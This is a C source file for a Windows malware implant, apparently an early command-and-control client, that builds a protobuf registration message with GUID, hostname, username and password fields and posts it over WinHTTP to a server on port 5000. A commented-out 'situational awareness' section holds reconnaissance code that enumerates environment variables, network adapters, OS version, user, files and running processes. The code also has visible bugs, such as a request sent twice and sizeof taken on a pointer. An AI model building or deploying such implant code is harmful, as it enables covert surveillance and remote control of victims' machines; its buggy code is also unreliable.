#define PB_ENABLE_MALLOC 1
#include "debug.h"

#include "implant.h"

#include <windows.h>

#include "execute.h"
#include "httpclient.h"

#include <stdio.h>
#include <string.h>
#include <iphlpapi.h>

#include <pb_encode.h>
#include <pb_decode.h>
#include "implant.pb.h"


LPBYTE *ImplantID;

// Function to RegisterImplant message
BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
	bool status = pb_get_encoded_size(bufferSize, RegisterImplant_fields, ri);
	if (!status) {
		DEBUG_PRINTF("Failed to get RegisterImplant size: \n");
		return NULL;
	}
	
	BYTE *registerBuffer = (BYTE *)malloc(*bufferSize);
	pb_ostream_t stream = pb_ostream_from_buffer(registerBuffer, *bufferSize);
	
	status = pb_encode(&stream, RegisterImplant_fields, ri);
	
	if (!status) {
		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
		free(registerBuffer);
		return NULL;
	}

        printf("[+] Successfully encoded: %llu\n", stream.bytes_written);
	return registerBuffer;
}

LPBYTE SendToServer(LPCWSTR VERB, LPCWSTR PATH, BYTE *buffer, size_t bytes_written) {
	
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	//LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		   hConnect = NULL,
		   hRequest = NULL;
	BYTE *responseBuffer;

	// Use WinHttpOpen to obtain a session handle.
        hSession = WinHttpOpen(L"A Custom User Agent",
                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME,
                        WINHTTP_NO_PROXY_BYPASS, 0);
	
        // Specify an HTTP server.
	if (hSession) {
		LPCWSTR SERVER_NAME = L"0.0.0.0";
		hConnect = WinHttpConnect(hSession,
				SERVER_NAME,
				5000,
				0);
	}
	printf("HTTP Verb: %S\n", VERB);
	// Create an HTTP request handle.
	if (hConnect) {
		hRequest = WinHttpOpenRequest(hConnect,
				VERB,
				PATH,
                                NULL,
				WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES,
				0);
	}

	// Set the Content-Type header
        WinHttpAddRequestHeaders(hRequest,
                        L"Content-Type: application/x-protobuf",
                        -1,
                        WINHTTP_ADDREQ_FLAG_ADD);

	printf("add headers good.\n");

	// Send a request.
	if (hRequest) {
		bResults = WinHttpSendRequest(hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS,
				0,
				WINHTTP_NO_REQUEST_DATA,
				0,
                                0,
				0);

        // Send the request
        if (!WinHttpSendRequest(hRequest,
                                WINHTTP_NO_ADDITIONAL_HEADERS,
                                0,
                                buffer,
                                sizeof(buffer),
                                bytes_written,
				0)) {
                printf("Failed to send request. Error: %ld\n", GetLastError());
        }

	// End the request.
	if (bResults) {

        	// Receive the response
        	if (WinHttpReceiveResponse(hRequest, NULL)) { 
			printf("recieved.\n");
		}

			do {
				printf("Checking for available data.\n");
                        	// Check for available data
                        	dwSize = 0;
                        	if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                	printf("Error %lu in WinHttpQueryDataAvailable.\n", GetLastError());
                        	}

                        	// Allocate space for the data
                        	responseBuffer = (BYTE *)malloc(dwSize + 1);
				//pszOutBuffer = new char[dwSize+1];
                        	if (!responseBuffer) {
                                	printf("Out of memory\n");
                                	dwSize = 0;
                        	} else {
					printf("Reading the data\n.");
                                	// Read the data
                                	ZeroMemory(responseBuffer, dwSize + 1);
                                	if (!WinHttpReadData(hRequest,
								(LPVOID)responseBuffer,
								dwSize,
                                                        	&dwDownloaded)) {
                                        	printf("Error %lu in WinHttpReadData.\n", GetLastError());
					
                                	} else {
                                        	printf("Server response: %s", responseBuffer);
                                	}
                                	// Free the memory allocated to the buffer
                                	// free(responseBuffer);
                        	}
                	} while (dwSize > 0);
		}
		// Clean up
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);

		printf("responseBuffer = %s.", responseBuffer);
		return responseBuffer;
	}
	// Clean up
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
	return NULL;


}


// Function to set the ImplantID using the machine's GUID
void ReadMachineGUID() {
	DWORD dwSize = 255;
	ImplantID = malloc(dwSize);
	LONG res =
		RegGetValueA(HKEY_LOCAL_MACHINE,
				"SOFTWARE\\Microsoft\\Cryptography",
				"MachineGuid",
				RRF_RT_REG_SZ,
				NULL,
				ImplantID,
				&dwSize);
	if (res) {
		DEBUG_PRINTF("Failed to get machine guid\n");
		exit(1);
	}
}

// Function to register Implant with the Server
int RegisterSelf() {
	RegisterImplant ri = RegisterImplant_init_zero;
	
	ri.GUID = "1234567890";
	ri.Hostname = "test";
	ri.Username = "userwoozer";
	ri.Password = "pass";

	size_t bufferSize = 0;
	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &bufferSize);
	
	LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, bufferSize);
	
	if (response == NULL){
                DEBUG_PRINTF("Bad response.");
                DEBUG_PRINTF("response = %s", response);
        }
	
	return 0;
}


int main() {
	DEBUG_PRINTF("Starting Implant.\n");
	
	int result = RegisterSelf();

	if (result == 1) {
		DEBUG_PRINTF("Failed to register with the Server!\n");
		return 1;
	}
	printf("[+] Successfully registered Implant with Server!\n");

	return 0;
}

/**
//SITUATIONAL AWARENESS

// Function to gather and print environment variables

//read environment variables
void getEnvironmentVariables() {
    // Pointer to hold the environment variables
    LPTSTR lpEnvironment = GetEnvironmentStrings();
    if (lpEnvironment == NULL) {
        printf("Failed to retrieve environment variables\n");
        return;
    }

    // Iterate over each environment variable
    LPTSTR lpszVariable = lpEnvironment;
    while (*lpszVariable != TEXT('\0')) {
        // Find the end of the variable name and the beginning of its value
        LPTSTR lpszEqualSign = _tcschr(lpszVariable, TEXT('='));
        if (lpszEqualSign != NULL) {
            // Copy the variable name
            TCHAR variable[MAX_PATH];
            int length = lpszEqualSign - lpszVariable;
            _tcsncpy_s(variable, MAX_PATH, lpszVariable, length);
            variable[length] = TEXT('\0');

            // Print the variable name and value
            _tprintf(TEXT("%s: %s\n"), variable, lpszEqualSign + 1);
        }

        // Move to the next environment variable
        lpszVariable += lstrlen(lpszVariable) + 1;
    }

    // Free the environment block
    FreeEnvironmentStrings(lpEnvironment);
}


// Function to gather and print network interfaces
void getNetworkInterfaces() {
    // Variable to store the result of the GetAdaptersAddresses function
    ULONG result = 0;

    // Variable to hold the buffer size needed for the adapter information
    ULONG buffer_size = 0;

    // Call GetAdaptersAddresses with a NULL buffer to get the required buffer size
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &buffer_size);
    if (result != ERROR_BUFFER_OVERFLOW) {
        printf("Error getting buffer size for adapter information\n");
        return;
    }

    // Allocate memory for the adapter information buffer
    IP_ADAPTER_ADDRESSES *adapter_addresses = (IP_ADAPTER_ADDRESSES *)malloc(buffer_size);
    if (adapter_addresses == NULL) {
        printf("Memory allocation failed for adapter information\n");
        return;
    }

    // Call GetAdaptersAddresses again to retrieve the adapter information
    result = GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapter_addresses, &buffer_size);
    if (result != NO_ERROR) {
        printf("Error getting adapter information\n");
        free(adapter_addresses);
        return;
    }

    // Iterate over the adapter information and print relevant details
    for (IP_ADAPTER_ADDRESSES *adapter = adapter_addresses; adapter != NULL; adapter = adapter->Next) {
        printf("Adapter Name: %ws\n", adapter->AdapterName);
        printf("Description: %ws\n", adapter->Description);
        printf("IPv4 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Address.lpSockaddr != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("IPv6 Address: ");
        if (adapter->FirstUnicastAddress != NULL && adapter->FirstUnicastAddress->Next != NULL) {
            printf("%s\n", inet_ntoa(((struct sockaddr_in *)adapter->FirstUnicastAddress->Next->Address.lpSockaddr)->sin_addr));
        } else {
            printf("None\n");
        }
        printf("\n");
    }

    // Free the memory allocated for the adapter information
    free(adapter_addresses);
}

//get the windows version 
void getSystemVersion() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (GetVersionEx((OSVERSIONINFO *)&osvi)) {
        printf("Operating System Version: %d.%d\n", osvi.dwMajorVersion, osvi.dwMinorVersion);
        printf("Build Number: %d\n", osvi.dwBuildNumber);
    } else {
        printf("Failed to retrieve system version information.\n");
    }
}

//to get the current user and token (is this getting the token??)
void getCurrentUser() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;

    if (GetUserName(username, &username_len)) {
        printf("Current User: %s\n", username);
    } else {
        printf("Failed to retrieve current user information.\n");
    }
}

// Function to get computer name
void getComputerName() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1]; 
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (GetComputerName(computerName, &size)) {
        printf("Computer Name: %s\n", computerName);
    } else {
        printf("Failed to retrieve computer name.\n");
    }
}

//get machine GUID
void getMachineGUID() {
    HW_PROFILE_INFO hwProfileInfo;
    if (GetCurrentHwProfileA(&hwProfileInfo) != NULL) {
        printf("Machine GUID: %s\n", hwProfileInfo.szHwProfileGuid);
    } else {
        printf("Failed to retrieve machine GUID\n");
    }
}

// Function to list files in a directory
void listFilesInDirectory(const char *path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    // Prepare the search path
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);

    // Find the first file in the directory
    hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Error opening directory: %s\n", path);
        return;
    }

    // Iterate through all files in the directory
    do {
        // Skip directories
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            printf("%s\n", findFileData.cFileName);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    // Close the search handle
    FindClose(hFind);
}

//change current directory
bool ChangeDirectory(const char *path) {
    if (SetCurrentDirectory(path)) {
        return true; // Directory change successful
    } else {
        return false; // Directory change failed
    }
}

// Function to enumerate and print running processes
void listRunningProcesses() {
    DWORD count;
    PWTS_PROCESS_INFOA pProcessInfo;

    // Get the list of processes on the terminal server
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcessInfo, &count)) {
        printf("Failed to enumerate processes on terminal server\n");
        return;
    }

    // Iterate through the processes and print information
    for (DWORD i = 0; i < count; i++) {
        printf("Process ID: %d, Session ID: %d, Process Name: %s\n",
               pProcessInfo[i].ProcessId, pProcessInfo[i].SessionId, pProcessInfo[i].pProcessName);
    }

    // Free the memory allocated for the process information
    WTSFreeMemory(pProcessInfo);
}

**/
